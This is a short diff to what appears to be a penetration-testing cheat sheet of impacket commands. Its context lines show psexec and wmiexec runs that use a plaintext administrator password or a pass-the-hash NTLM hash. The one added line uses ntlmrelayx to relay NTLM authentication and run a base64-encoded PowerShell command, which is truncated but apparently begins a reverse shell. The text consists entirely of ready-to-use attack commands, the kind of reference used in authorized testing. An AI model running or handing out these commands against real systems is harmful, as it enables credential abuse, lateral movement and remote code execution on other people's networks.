@@ -329,6 +329,7 @@ impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-psexec Administrator:'Password123!'@<RHOST>
 impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
 impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
+impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 ~~~
 
 # MSSQL - 1433
